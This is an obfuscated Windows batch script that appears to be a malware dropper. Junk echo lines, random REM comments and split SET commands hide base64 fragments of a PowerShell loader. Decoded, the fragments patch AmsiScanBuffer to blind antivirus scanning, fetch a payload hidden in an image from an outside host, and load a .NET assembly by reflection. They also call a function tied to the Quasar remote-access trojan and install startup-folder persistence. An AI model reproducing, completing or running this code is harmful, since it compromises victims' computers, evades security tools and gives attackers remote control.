@echo off
echo bUJUQlFFZUZpbnVCVjJUUnd5TmlnT2NLT3FNdkFIckFOOWxneWFmQ3FEYTVyRm85c3RvU1d3eGdhalNDTzBzZHJDRzZ6ZmZI >nul 2>&1
Se%uJPMk%T "XLAWigsCLTbT=pXyfpwaAvGhiZucI"
REM pixel undergrowth twilight lance sword circle
echo ZTFESVVWaW5pM2NlaFRId09tSHZBSGtTTm1MTTVodzhIMlA4OWZzVlJMV1FtNlNGVmNoQjlhcTJScE1OVVZYMUhi >nul 2>&1
SE%zmtY%t "TWWgpqmuCcM=wVCnPSHTzRKHQXGWkLgzYW"
SE%HhR%T "IxIJKvYKQvqH=VJysFvXqvECIXL"
REM pixel phantom kiln core mirage
se%JPomE%T "LReYAdT=vpfKockYJoQASvnXyxSBqRaPwoMjRiotU"
SE%BNh%T "rlFwoaZKgYdY=IwAqUZdrCaYqztqPOnrV"
echo RmprcHhodHBrT2NyVUd4Mm9oR2d5WWhUUU80c09xcUNaM1RoMElINEVyTWpDcFNrdXZpd1Q5QUlWc21GTGlNdzBuSHRpRQ== >nul 2>&1
REM hawk vertex hawk ruby valley
REM kiln echo lance ruby pixel fragment twilight mirage hawk vertex
REM binary fathom fragment hawk guard fathom kappa circle odyssey
Se%WFnf%t "tdBegOJZxf=hQUCQRWODsnfTbENTaaLfYXHfkR"
REM odyssey twilight valley
REM kiln vertex pixel cipher strobe core beacon
sE%iZTOT%t "DjLrmRfd=qJuaNWhCEVVIrKLGtClOmtJpOJq"
echo b01ZUmh0N0VWaUhtV1BoeHRwRUdwR3RHN2FYWWpGbU4wRGF4aG80WGRvMWw5ZmlxbU1iVlpmS1JXeTRGZVpUVVpVNEw3d1Y= >nul 2>&1
se%dHZMH%t "fTwrpm=aSOfXXTxFFBJooEbJnNsIUxcuDn"
REM clearing binary clearing
se%whmGX%T "CRjPAnabaN=cxdEqjiFQDxvTKjwiCVTrEb"
REM shadow twilight ruby valley undergrowth phantom hawk core
REM circle vertex ruby
REM binary circle guard clearing valley
SE%hew%T "wPdOzNy=rigSisaGUQIp"
Se%jOyX%T "qvHnFXdWxrSPcRT=IZVRSQDdtHdUHizlnbZHPYxfqyija"
sE%ZHn%T "OUKaTdXPkkNzXXU=dmCMqpivinFFPVkpvRuE"
SE%pxBN%T "MluOLjrlYOp=TurrRchiffSrDvy"
REM zenith kappa vision clearing ruby lance echo
Se%auV%t "wsrzpAmJFj=oKQrYdbRoAFnfpjPfKbWaFNygyGIj"
Se%uKKPi%t "aCkRUWgSCOjDCmv=AftqVeibOQrtYmNGnq"
se%HXCwp%t "GcQCiGGKIutKW=ZCXzMFPogBcMMQD"
REM vision fathom glimmer circle hawk pixel ruby valley
SE%KYcnM%t "PLUEkyfqSkYipd=sQISoGtabQSuiiOuDZzHlBJIaPwbda"
REM twilight kappa kappa
Se%NCoD%t "rIVbILi=iOvvMinvGcsDK"
REM vertex cipher valley lance ruby beacon phantom twilight zenith pixel
echo b09VMnlwQzE5SkpVdnZSeXVTc3ZkY3BKbzRPaDJ5UXl2U0dFWlozM0lD >nul 2>&1
SE%WHU%t "pk_UABV_0011=mZlciIpCmlmICgkcHRyIC1lcSBbSW50UHRyXTo6WmVybykgeyByZXR1cm4gfQokcGF0Y2ggPSBbYnl0ZVtdXSgweEI4LCAweDU3LCAweDAwLCAweDA3LCAweDgwLCAweEMzKQokb2xkID0gMAppZiAoJHR5c"
REM vision clearing circle cipher twilight echo vertex delta valley delta
se%VvsM%T "fKddDLcuP=DkXWBVfNNnpuoHlxhYrENLtrmhOYQZHvxK"
echo MVJQWktBMFZlMmc2SFFoMXhlMmNMSFI2Zkg2MWF4VUQ2SElyQ3VqWW40ekg0Y3I5MXIxNjlSUWRVWlZqTHZRRmdiQzhLMllpMg== >nul 2>&1
se%RQYjE%T "WGhtntH=WFEIwutoqSoABaV"
se%sOlU%t "FwbtYQSfQlyXKb=QKrcpGaPYzzezOmMASJreWrFY"
Se%Xbd%t "MUjhpedqYzcA=twZsuzkKHhnfTntqhmTuTEGADNIzfTJcQ"
echo OGQ4SXVlZ2ZEM3dueXF2OFppUDNwR0FaNDdoWkJ2T3ZtZldjU1VOZ0daZ3NlMUxYbDZaSTk1WnVHTnpXdE5yY2o= >nul 2>&1
REM kiln odyssey pixel binary mirage vision odyssey kappa kappa
REM echo undergrowth undergrowth valley echo echo twilight
REM odyssey core echo clearing core shadow
Se%rGIx%t "MLhTfS=hExOBzuCBVHlNZzVRiQRPGCcVHfhGavROk"
echo N3N4azhLZWRaZ0tqWDZTMXg0aGREWmtHR3hGekhVTlI1cndjTWprYXl0MkFHc3d1ZWNHZDlVVHJlbVAzbTdUdjdHQ2Nu >nul 2>&1
SE%Fjrhu%T "nCOQaDkNEltJSQ=zdqKvTYuqt"
REM shadow valley mirage beacon echo ruby pixel
echo amx6MTA0REtkOXdiUEVyTTZOY1A3bkRJeDdRSE5xZDZpMWR5Ym9qYW04RFY2blQwdjl4enNZTk0= >nul 2>&1
REM echo core pixel fragment sword delta twilight fathom clearing
REM twilight guard pixel odyssey mirage vision fragment
Se%zZk%T "NWaDupuJkfPY=taPwoCLRkbsx"
SE%juHX%t "vzAlYkfdWKtW=nUPwxeZAOHggC"
REM fathom shadow kappa kappa undergrowth sword twilight sword core
Se%kgnjX%t "brCXUfklyVpV=pldXnitUlG"
sE%hes%T "SdmGELlqSiiW=psNcHxJleylTnwxstDmtqsoyxvnxLB"
echo MldXNkZyTUl4NjIyMTVibnQ0UFkzZ2V0U3pLRDZWQlg4NEJYc3g4YU1sOEJ3MW5Dd1hKalEwbGRKNHVUWEQySmZJS2R3ODJYcDZubTha >nul 2>&1
REM sword circle clearing vision undergrowth vision vertex delta ruby
echo Sjg5UWhXUFF1c21RRWNMUGMxVmh0UWdYeDlIalZwNXVsVWg0U2JnU21RNmg5RGd1Y3FvTUt4MmJ0dzY5QXJJVTRP >nul 2>&1
REM twilight fathom twilight kiln vision echo
REM glimmer cipher undergrowth valley binary ruby mirage beacon strobe
echo WGhSek5pQ2VheExzVlU5cGZqWGpNYUJoVG5NdnBkblkyRldqTDZmUDh1NkVvRko4czhOYnBraTIzMmhPckYz >nul 2>&1
REM undergrowth kiln beacon pixel lance binary sword
REM shadow phantom circle
Se%jFyHP%T "pk_UABV_0042=3QtT2JqZWN0IC1GaXJzdCAxCiRsb2FkTWV0aG9kID0gJG1zY29ybGliLkdldFR5cGUoJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5JykuR2V0TWV0aG9kcyhbU3lzdGVtLlJlZmxlY3R"
REM fragment glimmer twilight core
REM vision glimmer fathom strobe strobe delta
echo VVVDbmFDcU5XWEQyYVBKZ0xiYWR2VW5MdWM2ZTZiVVZuU1N2NTFjZ1IwTW5ZOEVDQ0JYQkVuWXZlbmtISUNIeGZIeENMWEM= >nul 2>&1
REM lance cipher binary core vision delta beacon mirage kappa circle
REM guard kiln mirage guard hawk ruby vision glimmer
REM kappa core cipher circle
SE%DRBE%t "NRnSkTvKCYl=OhnNHXHQlHskQkAMhCKgHyPJI"
REM circle circle delta vertex sword
sE%kqkXe%t "qqRRuGuIQY=RZylDnrUAtux"
REM phantom zenith odyssey clearing clearing phantom
echo NzRnV1Z5RkpXcWFTdGJxOVhRcGdua0FKMGhWYnB2Y1RobHluN1M3dnB5dDJmcmVBbW9UcQ== >nul 2>&1
REM shadow sword undergrowth pixel beacon fathom guard
echo dmZFVzRqYWp1YVZvMEF5MkFpT0tvUHFBczdhWDZOVVJQeHcyMlNQRFZ3S1JKRGpVeDkyTDJSZmtTcnY= >nul 2>&1
REM echo phantom fathom phantom core phantom odyssey
SE%BJQ%t "uCZRpwyKkdow=gydPOghvEpATcvCjFSWdoZQbRfBnoiuqgy"
se%wWXBL%T "hooadn=LIGoyMHwNlhQcOFOIMgrtWsEppPG"
sE%cZOUc%t "qlVOAy=QxKonLQfTewSqut"
REM guard mirage pixel delta odyssey
sE%UwPRS%t "hbIYnyWzHKmj=juZKzhJZeVpRvjbggQWr"
echo TTdUbW5pUnI1aUVsRGpwWGU1TVIxZEEyOHd4aWh6V3Z3dEVENXNTWTN6cVBHWmVRamVuTA== >nul 2>&1
echo VzZuY0pkRUo0VFA3VE9VNVZxOE5UQVlRaFNjUUFIR3lmTXg4YnpGek9EVzJQV2JlUkFENXBBeWZQSVVEM2hieFV0ZjN3NUJWakI3aFpi >nul 2>&1
SE%WAU%T "HgqPMGKiYizac=WWUEfVEKzwIQidtZITaRbUT"
REM vertex cipher lance valley zenith cipher cipher pixel
echo ZTMxcVc4QnNqYzk5cVl6UXpoRlNaelhZWFVOR2ZLM2pWeW5DR3dXS20= >nul 2>&1
se%cIVBW%T "YnMTvkKvsbgmnq=fSLXMSqleAHPEau"
echo SVR1aHk0S2VRRjE4Mno1UFUzSUtQT2hVUDFkWnJpTmdTbEhicWJLUFR5cEJnaDI= >nul 2>&1
REM odyssey fathom clearing kiln circle beacon beacon
se%jlcT%T "tndMupC=wyrdXjUgSwWNTClywMtpHtuHRaOF"
echo TVQ4azk2NWNQaXN2aWNLem82cmtKZlVBa1d4STFmdGFNT00yTzRUcXdMQ0hqRGFT >nul 2>&1
sE%Efb%T "hOwYcPqoh=DjdxExkUMQuTbV"
Se%GRon%t "pk_UABV_0012=GU6OlZpcnR1YWxQcm90ZWN0KCRwdHIsICRwYXRjaC5MZW5ndGgsIDB4NDAsIFtyZWZdJG9sZCkpIHsKW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRwYXRjaCwgMCwgJHB0ciwgJHBhdGNoLkxlb"
REM valley odyssey cipher delta hawk vertex
sE%KKqUN%t "MayUbWSSsaVo=zbSiRwVxgAUJRUPdGTokLvluP"
se%THnAl%T "FucvRKaIzxSU=SJxhfuOxZFMjMGmZlbImQ"
SE%JFP%t "HsTguDgWP=GsFqAqVMFOraMVOfhXSlWc"
REM vision core zenith clearing binary fragment clearing kappa
SE%qTZy%T "XwxjvIBgpIDVyXZ=MuUlzZfJfBzFnotkLLNGExuSllBy"
echo azZWUUF5Z29DUkxWaDhFaVY5MVZpNlpTS1FBYmdMc3NwOU5BYUdmajQ0QkxzNzFOVmhUUjlXRk00a0tJVDNRNlNQ >nul 2>&1
se%QUXG%t "LSJwxltI=hueQiKVrlgTLAoTLfY"
REM core guard glimmer circle valley fathom fathom fragment valley
REM strobe kiln hawk binary
Se%Miu%t "XNdoRPYOIOXr=vNfLYyRHplA"
REM cipher fathom odyssey echo sword fathom binary
REM binary guard mirage vision zenith shadow echo
REM odyssey fathom ruby clearing ruby circle
REM echo cipher odyssey fathom delta hawk vertex clearing shadow undergrowth
REM hawk ruby lance delta vision sword beacon
sE%eDVp%t "bCKbnMKkRoxx=ncSXzeNFoLzqBcmgMSiYeXAL"
se%KjCyr%T "UaLsVSDDDFnmrC=ZRltqGPdbNkhOOaIH"
REM delta hawk circle twilight vertex echo
REM circle kiln delta delta guard valley twilight beacon
echo aDRPZmNmelZmdVhCQjBzeTFjMUt3aVJiMUZZd1NXdUFiS3Z4a2Q5WUpQWEtKRnM4SzE5dlZ4d3F1TjFjODJPUUt3Mg== >nul 2>&1
REM binary kiln kappa twilight undergrowth clearing kiln
se%ruJ%T "juxAbyoYTzC=DYnDmYbapsezbiBrnNjiZT"
se%HBv%t "kanCkYs=ixvqIcpwRpRkBQiGNeuMidB"
se%yBAv%T "NBqXAgbYxn=vpAeRiHIBRCVEOswg"
REM ruby shadow ruby fragment glimmer
echo RXVIWkE4M1c2Rks2eEU5OWl0Q0NOalZFU0htNHgwWGx2YUVvcDhMVTVWTHVKNDRTc0QyeA== >nul 2>&1
REM binary core core echo cipher
REM undergrowth beacon strobe guard lance kappa
echo dHpLRlZGTVVYM09zN2NwSXUwZ3FWWXhWQ1ZqcnZWNlFsNVVxcFNPaVZsSGpyQlhWVENhT081VllpR2RFenE= >nul 2>&1
REM core twilight zenith
sE%ZyuEl%t "HweBmGnMcYhmw=TMKWVleYoeZlPsxzSoGw"
echo U3hqMXNKU1ppaXZaZE9EM3VCc0x2TjJjeTF4djhoaEN3M1lmTUNWeUIzYk45NQ== >nul 2>&1
sE%thALr%T "TkcBgqzJsNNeN=OjELlcTwOrNhhkf"
se%PLHPk%t "YHqvCkXQZ=jeEjbuUBRcspdLOrTrChyElfYGMi"
REM clearing valley zenith zenith beacon beacon cipher core
REM undergrowth binary vision
REM delta glimmer lance hawk hawk
se%XXIC%t "pk_UABV_0000=JFNpbGVudCA9ICRmYWxzZQpmdW5jdGlvbiBMb2ctU2lsZW50IHsKcGFyYW0oW3N0cmluZ10kTWVzc2FnZSwgW3N0cmluZ10kQ29sb3IgPSAiV2hpdGUiLCBbYm9vbF0kSXNFcnJvciA9ICRmYWxzZSkKaWYgKC1ub3QgJFNpb"
sE%ntv%t "zVOqQz=IRjgOUokNkaRhYKWTqvjcvHedxdoSWrp"
Se%czDW%T "vtAAwBYDtuQCDw=eHCQfyknniBWEvVJGpzRJ"
REM ruby vision twilight phantom echo beacon strobe kiln kiln echo
REM kappa kiln mirage fragment core circle binary undergrowth
REM glimmer strobe valley fathom ruby binary delta
Se%TRUy%T "YdefpMIbccP=tMvyWNkJRDXcDkYzdvgLSEq"
se%NllF%t "NWhOMXF=keZrnEqokAWdlWpYzMfxqIKId"
SE%XnQrl%t "QombPAE=umtOwTBjgNxbaItHefjBqGzknHwQz"
SE%DtYr%t "pk_UABV_0016=dGlvbiBJbnN0YWxsLVBlcnNpc3RlbmNlIHsKcGFyYW0gKFtzdHJpbmddJFN0YWdlclVybCkKJHN0YXJ0dXBGb2xkZXIgPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6QVBQREFUQSwgIk1pY3Jvc29mdFx"
Se%BRD%T "fYqlbAiW=LsBWMGZoxUSpqxGnjZBZwkCEGoxdoObIN"
SE%BSHj%t "nwupuFSobO=zNgLXqzwSykGSQGiJvSMLxFPjWQGvlHHq"
SE%Yjs%T "TbGISljTfgOu=YxjDzVlIKLgpH"
SE%xdtK%t "HpFVgZTDajUCWY=qFvNZqCQFGWloRrC"
REM twilight mirage odyssey sword mirage
REM guard binary beacon odyssey
REM kappa sword kiln glimmer beacon clearing phantom echo pixel
echo ejJNMTNTZzdWTVQ5c2VRdmxLSTc1N3RTUlhCZEZ2c293bTl5ZmJFWXFETG9jRmVFZk5XTkU2SHg4YVdiMmpLZUdmdDN2b0o3 >nul 2>&1
REM shadow glimmer hawk core
echo SFozdURxQzI4TnFBbGEwaXpLVlJEckRaSkhLUkh5cWlxblUzMGVubkZ5bkdJYUY3Z3pya2hqOUk= >nul 2>&1
Se%BlUyQ%t "OasSLpFXIUZJhR=EAXwrQkVVuMlMvpf"
REM fragment twilight zenith
sE%snOpm%T "cQHnab=bGpMXEtKtkyQZYaSUROxaCSBYwroqmDugy"
se%NtBCQ%T "RwJgIotxce=dcAJxkKIYopa"
se%BFi%t "UsFbTFwSFQLQ=VhnIIkXnsKDYPZyALasDLBHDXq"
Se%QzT%T "rgfZlCNQaEOU=TMMeouWFFFlEBKUk"
SE%ibOvj%t "bBFOvHFAP=zgTIFGAZqFMU"
echo d3BsZUo4WEd0dHJEdWJ6UXkyYkpzalJ2c2tkd0pSNkNWUmlLZnhyTklrblhWY1hHc2NrMjhENWY5MTJqOG5Zd3pRNGR2clFJVTNPTVJSUHQ= >nul 2>&1
REM valley circle delta circle guard hawk phantom
se%VDDE%t "pk_UABV_0010=ewpMb2ctU2lsZW50ICJbKl0gR2hvc3QgUGF0Y2ggc2tpcHBlZDogYW1zaS5kbGwgbm90IGluIHByb2Nlc3MuIiAiR3JheSIKcmV0dXJuCn0KJHB0ciA9ICR0eXBlOjpHZXRQcm9jQWRkcmVzcygkaEFtc2ksICJBbXNpU2NhbkJ1Z"
Se%nbi%T "AUYlhYlOVc=QynyWpcEQxucrqrHULExsKsvfKwhwhM"
echo QnNCcXNJYTZOYVVJMXpWdTZ2enVhYWVUbXdMYTc1N3lVNmhxekNERTJCcUtSZjRTRkROUEtRRmx5Z3RSeHRRemhQcXpBU2RpeEhJWVg= >nul 2>&1
Se%VkEAm%t "pk_UABV_0015=TCA9ICJodHRwczovL2kuaWJiLmNvLzhuSFpCTXNUL21lbS5wbmciCmlmICgtbm90ICR0YXJnZXQpIHsgJHRhcmdldCA9ICRJbWFnZVBhdGggfQppZiAoLW5vdCAkdGFyZ2V0KSB7ICR0YXJnZXQgPSAkSW1hZ2VVUkwgfQpmdW5j"
sE%zwBX%T "SryrsQHw=frNtaTHSigkPKAMWVm"
sE%Gwyjo%T "pk_UABV_0027=dGlvbih7IHBhcmFtKCRzLCAkZSkgTG9nLVNpbGVudCAiW0ZBVEFMXSAkKCRlLkV4Y2VwdGlvbk9iamVjdC5NZXNzYWdlKSIgIlJlZCIgfSkKZnVuY3Rpb24gSW52b2tlLVF1YXNhclN0ZWFsdGggewpwYXJhbSA"
SE%fUOM%t "iZcFLjnt=fkfldBGWkSqeqbc"
REM core odyssey shadow vision strobe zenith
sE%DqZvU%t "LOvuFDIrCzAQwCR=zWZTCYXhOWaxeluL"
se%HuQp%t "pbXOVWDEqz=GBWYkKWQFRFyEgkJefehNTt"
REM phantom guard binary binary mirage ruby core
REM guard shadow fathom valley zenith undergrowth vertex glimmer
se%xvdum%T "pk_UABV_0001=GVudCkgewppZiAoJElzRXJyb3IpIHsgV3JpdGUtRXJyb3IgJE1lc3NhZ2UgfQplbHNlIHsgV3JpdGUtSG9zdCAkTWVzc2FnZSAtRm9yZWdyb3VuZENvbG9yICRDb2xvciB9Cn0KfQpmdW5jdGlvbiBEaXNhYmxlLUFNU0"
sE%CJy%T "tpxpYKOhcrDqBAW=fSekplZkHnVbGjtCvpMGTvx"
REM echo beacon undergrowth lance twilight twilight kiln
SE%GtZhw%t "pk_UABV_0035=Zm9yICgkeCA9IDA7ICR4IC1sdCAkdzsgJHgrKykgewppZiAoJHkgLWVxIDAgLWFuZCAoJHggLWVxIDAgLW9yICR4IC1lcSAxKSkgeyBjb250aW51ZSB9CiRweCA9ICRibXAuR2V0UGl4ZWwoJHgsICR5KQokZXh0cmFj"
REM undergrowth sword shadow lance pixel
se%pRy%T "upOXAVF=MMgRlJGQiieWECtGRGD"
REM core undergrowth delta valley beacon phantom glimmer
SE%CCw%T "oJYXCV=ZkygUOeaQZPhmAyBlKbxgiyiiXZhuWi"
REM kiln delta fathom delta shadow binary vision
echo WXhtRE9mbWpzYjdsQXdzMEdsT3o1MjNtZUFsdERTdThiY1ZkVFRZaUJaSjNKY1l5QkpTYWMwY0pFNEZtRTJ1ZXNLaGh4Snl1NUs= >nul 2>&1
REM kiln pixel mirage zenith fathom lance hawk ruby
echo YVVVSmgwSEd5V3RyYTNvZXFQSFRidXpRNlY2ZDdUR2MwbVJzOGNuOVV3OTdGYjl6WnREUVJYWHJBS1cwU2kwbQ== >nul 2>&1
REM phantom valley kiln kiln guard
REM beacon cipher cipher fathom core lance fathom clearing sword cipher
echo R2RBM3F4QXJKWkMwTWFPSm8xcU14VlM4NGJsYkJvckM4QXpRMm5qWFY0bTEya2RKVE1kbg== >nul 2>&1
REM kappa pixel undergrowth
REM cipher glimmer beacon vision fragment kiln vision vertex
REM strobe vision valley odyssey vision vertex vertex circle
REM fathom phantom echo beacon ruby hawk clearing beacon pixel zenith
REM phantom fathom zenith core mirage pixel shadow binary odyssey
se%fDjj%t "HYDAOt=hIWnCfbflDueMIIqyNGLJUtQtHTziKPWw"
REM vision binary odyssey undergrowth pixel lance echo
REM guard kiln lance mirage clearing echo clearing
REM undergrowth odyssey kiln mirage
Se%OoMm%t "ztxUoOtCOMRaHq=HagWusaDcaPIpcJkmrEtOYOPRzhwItTQO"
sE%sTL%t "hQsSGJRzZw=MkSVjNVIKwnZaXRBnCXRh"
REM clearing ruby pixel delta
sE%qLeEw%t "XtqysosXUjAWrd=GPuGHsGfxXl"
REM binary guard valley core zenith core strobe
Se%tmwqf%T "bQzPKhKldniqSfB=cCvSgfztVOHNVbKhIzTPptTlVP"
echo bW1QRE1vT3JodEtTdEtrRWJ2cnFCTnBySXlPaUNmMUZpQWZuR3FaZG4ySzg1 >nul 2>&1
REM odyssey pixel vision strobe shadow kappa zenith kappa vision circle
SE%tQNlu%t "pyoqGnpp=agjsGqWFuZTAeNMALzJAFAGgQRQWzinbg"
REM twilight fragment strobe shadow glimmer echo phantom glimmer undergrowth fathom
se%omzR%t "XuVjJWQNx=IzwUGRsACRQOZgxUlNEEPtukSU"
REM pixel delta core fragment echo ruby
echo TnRndE1uTG1VVTNtOUV2UVo0QlpOeTFjeURGTjFxckN0WWFVakpmcm5FYlM4WWMzakRuUVN3MnNteThZSnlXTk1GUA== >nul 2>&1
SE%iZl%T "IVSwTiU=nDtdXDwJiwjh"
echo cFRSVk9tZGVkOGRXMXdPUHdNZWdackhFWXdrT3g0V1c2Z1Y2ekhvc1Z6NUZqUEt2bw== >nul 2>&1
se%XsFep%t "blcoCBD=CDUlJKnUBFORJzQvSSuD"
sE%mxbcH%t "pk_UABV_0024=2l0aHVidXNlcmNvbnRlbnQuY29tL3doYXRldmFib3kvY3VybHljYXJuaXZhbC9tYWluL3VzZXIudHh0IgppZiAoJFBFUlNJU1RFTkNFX1VSTCAtYW5kICRQRVJTSVNURU5DRV9VUkwgLW5vdG1hdGNoICJSRVBMQUN"
REM zenith glimmer odyssey
REM zenith ruby delta echo shadow echo binary guard hawk
REM phantom guard kiln vertex twilight core zenith sword fathom
echo Z08wUHhIYk82dHFJTXVQcVBHUEtTWDNzWVJMVk5ydFZHenVqZzFvWDVXTTBwakgxN3Fx >nul 2>&1
REM fathom shadow binary binary core
echo TlVuMmY1anA3aHZNeTI1amZqZVFJd2RPUzIxZ3Y0TllSUHFPUVZkbEpEUVpTVVJLQWZXTDVkdmFwbmpIZkdOYktnTUE5c1NDaXlybVNTMG4= >nul 2>&1
echo UG5GZVRERE5XVndJZ0k1QWNNMGxpVVNCTGYyR3hXTW43NDk0Y2Via2RqZ1NyMkM4NVpIRTJWNm1FVUxLUjVjVThwdDRHTXNTcg== >nul 2>&1
SE%Bqx%t "qYCZFlQiMAQs=bRrSJraVafRWQWtnhfVRsFbSnd"
REM shadow pixel odyssey kappa kappa ruby binary guard hawk
REM fragment valley binary odyssey fathom mirage odyssey twilight
Se%Fnv%t "IIxPzKrM=QEUkyzieCPvpZjvsPVG"
SE%Ruu%t "bdenHdObq=klxPcooZBEmbrDjhnxXRFUpDyx"
REM kiln undergrowth twilight echo
echo ZG9vV1UxWldMNXpFYkZZUzZmbXBkMENaNHdJM3N5MkY1T1lIb3Jsb2MxUVBkdjQ4cHA2MHN6bFNMQ01MTnFEWWx3YWZKaXlDdkRQc0JN >nul 2>&1
REM cipher vertex valley
SE%EEtEm%t "iDoXJzEoFD=aSwoZdIprZQfCbxKRBwQu"
REM clearing vision mirage ruby fragment vision mirage fathom
sE%Fum%t "lAecuMLnENLj=QxneQbvMeyEencPkFtBfmKTvh"
se%hDP%t "SYvdlVk=huWahLqcqRBpTTEPXeOwMFdViNXujeCf"
se%iXwV%T "ITIfZUA=YoWGdhdkelKKXOBAdqWhVLpkPZRQKfRoLwI"
se%qTcs%T "frLFsTK=RHTEhgxykuxgvBhjGOIrOmZezznlDMtxKmd"
REM vision core ruby guard zenith hawk vertex glimmer
sE%jpLGc%T "AAQvAhQ=wwnQXGCPNFdvvqlCdwqAqoSPwsc"
sE%CnEkl%T "kGyMOp=BXOIzUJbwXErANPvmigFOGEnhQEitrc"
se%XSNP%t "VLyPcNY=eqfdfNNVpqDpQKubKKG"
REM vision undergrowth fragment kiln ruby core fragment undergrowth kiln
REM binary ruby cipher vision
sE%yBw%t "pk_UABV_0046=50IC1lcSAwKSB7ICRlbnRyeS5JbnZva2UoJG51bGwsICRudWxsKSB9CmVsc2UgeyAkZW50cnkuSW52b2tlKCRudWxsLCBAKCxbc3RyaW5nW11dQCgpKSkgfQp9Cn0gY2F0Y2ggewpMb2ctU2lsZW50ICJMb2FkZXIgRXJyb"
echo MTQyR1VLbnFwMjZ0amRySWJYaFhta1VHYXY1b0VBb0lQYUhBcmtEN09JNFNDck12T3dVSDV2eWVId3VieXFmTXo= >nul 2>&1
sE%gJtxt%t "AEFyljQ=YFfdBelxTxQ"
echo d01yVjRHbkZCOHZjTlZqNDdZWFM4M0lDZVU0cTNOMG9OOVFZQnU3a0xkZVVqZzdGYmVkMGVUS2hkZGdIYVZGRUpsRW44bzVRSlBOcUJYSA== >nul 2>&1
echo VGdScUJ3aVZxZzgweVlMT0FJUXYyRzZiV0h1algzWEU4cnU1a1dHWmRLNE13d1VtcE55 >nul 2>&1
echo ajcxVU10SkIxaDl3Mkk1Vk1QNEYxZTRHOW5WVDhqMkhqNmJrQXJYZWV2TXRiem9FblhxRGNCelhyRk8ydGduOEZud2tmdWU= >nul 2>&1
SE%vgg%t "GlZZqFffGa=zHOtBeyJOYPJxdhFuZXPlp"
SE%HKW%T "ILnxgVHERaBT=fjaXIntBbFhgmDETcTa"
echo bGZFNU42YTFoVnlIZ0RUS2NhOUVSOVZkRWFCOWVLRlVHdGJCYURITWpzMXJTOWRKaFhLV0ZMVktPMkczWVdRNXZSQlRvRjU= >nul 2>&1
echo bEE0NHFEbENZTUpDbkJuNnVSeDlJbkw2VnNiOHBzWHNrbk40Nm80TGFBVURYUkg= >nul 2>&1
REM mirage guard lance binary vision
echo ZHgxZm9lNjdpYVd0Um8zRFhscVJTdHVDZWFUS2VyWmlGOW1zMjVzR3FhVVY5RXVFaU90Tk5yVm1QczNiY3Q= >nul 2>&1
Se%cVm%T "xRreEwrlyHJbRqq=yXqylWWdrbrhs"
Se%EaEoX%t "aBLmvthbaI=IZaxqqFPkGBIJSMwnEcSMAAAa"
se%VZRw%T "GJDVOFeJsKXNWX=ASQwyjGUBNkjtjbjOMYr"
REM guard kiln mirage strobe hawk
echo NkRlZUpvTDRoNk9kNGpueUs5alkyb3J4T3Uyd29XMHZDb2ExVnFaN3RB >nul 2>&1
REM vision delta cipher fragment
SE%Wej%t "pk_UABV_0017=XaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cCIpCiR2YnNQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkc3RhcnR1cEZvbGRlciwgInN0YXJ0dXAudmJzIikKaWYgKFRlc3QtUGF0aCAkdmJzUG"
SE%Zvk%t "jSKNlYhh=AShuHsReSH"
REM echo undergrowth undergrowth zenith core guard vision valley
echo MHAzMWxsZUVhVFpPUjUwMjQ4TXpiUHR0a21JbmgwVFlxS05lNFE2QWJ1d1JlTQ== >nul 2>&1
SE%Rek%t "ZjCBNFggmJUnt=fllQYxofVgksf"
Se%CnH%T "xbseTBgRdMZkmsb=BkjhZrWWzqRzeTrUIvySEjAL"
REM odyssey cipher strobe cipher odyssey
REM binary zenith strobe odyssey
SE%fqsh%t "JvBdfh=qKirXOpCJHgzUYeTMiJLVHaeuTYcaTVfIzW"
echo YU1mYU1Vc05qQTY2ZUliNndPRHBacWlpRGFPQXpmZ085Tm9KYVhtbmFSSk1HZ1JtdEl2YTZKdkdBeA== >nul 2>&1
REM delta fathom guard zenith
SE%Uqdaq%t "TQoalALihPK=NGBQOaEuvVXPDbJcdgXJstfqhTiqLzzuN"
echo N0hPdEtETkxYQzY2Z2lnZDVON0VmVDZUV2dtWFZmNXhXOHR2TDY5d3g1QXdV >nul 2>&1
REM glimmer valley glimmer circle kappa phantom zenith pixel
REM fathom kappa undergrowth mirage odyssey strobe clearing odyssey
sE%orK%t "XxqKiakplPanjfo=QeRrtlrQOScHkUPaACIBNJfBdZt"
REM cipher mirage cipher vertex twilight beacon fathom pixel core vision
